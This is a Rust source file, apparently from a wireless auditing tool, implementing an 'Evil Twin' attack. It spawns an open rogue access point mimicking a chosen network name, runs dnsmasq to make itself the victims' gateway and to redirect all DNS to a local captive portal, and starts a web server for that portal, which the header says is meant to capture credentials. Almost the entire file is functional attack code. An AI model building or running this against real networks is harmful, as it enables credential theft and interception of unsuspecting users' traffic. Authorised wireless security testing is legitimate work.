//! Evil Twin Auditing module.
//!
//! Handles creating a rogue Access Point (using `hostapd`), configuring
//! a DHCP/DNS server (using `dnsmasq`), and running a local captive portal
//! server to capture credentials.

use std::process::{Child, Command, Stdio};
use std::fs::File;
use std::io::Write;

#[derive(Debug, thiserror::Error)]
pub enum EvilTwinError {
    #[error("IO error: {0}")]
    Io(#[from] std::io::Error),
    #[error("Interface error: {0}")]
    Interface(String),
}

pub struct EvilTwinConfig {
    pub interface: String,
    pub essid: String,
    pub channel: u32,
    pub portal_ip: String,
}

pub struct EvilTwinAttack {
    hostapd_child: Child,
    dnsmasq_child: Child,
    portal_child: Child,
}

impl EvilTwinAttack {
    /// Start the Evil Twin attack by configuring and spawning hostapd, dnsmasq,
    /// and the captive portal server.
    pub fn start(config: &EvilTwinConfig) -> Result<Self, EvilTwinError> {
        // 1. Create temporary hostapd configuration
        let hostapd_conf_path = "/tmp/aeroshield_hostapd.conf";
        let mut hostapd_conf = File::create(hostapd_conf_path)?;
        writeln!(hostapd_conf, "interface={}", config.interface)?;
        writeln!(hostapd_conf, "driver=nl80211")?;
        writeln!(hostapd_conf, "ssid={}", config.essid)?;
        writeln!(hostapd_conf, "hw_mode=g")?;
        writeln!(hostapd_conf, "channel={}", config.channel)?;
        writeln!(hostapd_conf, "auth_algs=1")?;
        writeln!(hostapd_conf, "wpa=0")?; // Open network to attract victims

        // 2. Set interface IP address
        let ip_status = Command::new("ip")
            .args(["addr", "add", &format!("{}/24", config.portal_ip), "dev", &config.interface])
            .status()?;
        if !ip_status.success() {
            log::warn!("Failed to assign IP to interface (might be already assigned)");
        }

        let link_status = Command::new("ip")
            .args(["link", "set", &config.interface, "up"])
            .status()?;
        if !link_status.success() {
            return Err(EvilTwinError::Interface("Failed to set interface state to UP".to_string()));
        }

        // 3. Create temporary dnsmasq configuration
        let dnsmasq_conf_path = "/tmp/aeroshield_dnsmasq.conf";
        let mut dnsmasq_conf = File::create(dnsmasq_conf_path)?;
        writeln!(dnsmasq_conf, "interface={}", config.interface)?;
        writeln!(dnsmasq_conf, "dhcp-range=192.168.1.10,192.168.1.250,12h")?;
        writeln!(dnsmasq_conf, "dhcp-option=3,{}", config.portal_ip)?; // Default gateway
        writeln!(dnsmasq_conf, "dhcp-option=6,{}", config.portal_ip)?; // DNS server
        writeln!(dnsmasq_conf, "address=/#/{}", config.portal_ip)?; // Redirect all DNS requests to captive portal

        // 4. Start hostapd
        let hostapd_child = Command::new("hostapd")
            .arg(hostapd_conf_path)
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()?;

        // 5. Start dnsmasq
        let dnsmasq_child = Command::new("dnsmasq")
            .args(["-C", dnsmasq_conf_path, "-d"])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()?;

        // 6. Start the captive portal web server
        let portal_child = Command::new("python3")
            .args(["-m", "http.server", "80"]) // Simple web server hosting the captive portal page
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()?;

        Ok(Self {
            hostapd_child,
            dnsmasq_child,
            portal_child,
        })
    }

    /// Stop the Evil Twin processes and restore interface state.
    pub fn stop(mut self) -> std::io::Result<()> {
        let _ = self.hostapd_child.kill();
        let _ = self.hostapd_child.wait();
        let _ = self.dnsmasq_child.kill();
        let _ = self.dnsmasq_child.wait();
        let _ = self.portal_child.kill();
        let _ = self.portal_child.wait();

        // Clean up temporary files
        let _ = std::fs::remove_file("/tmp/aeroshield_hostapd.conf");
        let _ = std::fs::remove_file("/tmp/aeroshield_dnsmasq.conf");

        Ok(())
    }
}
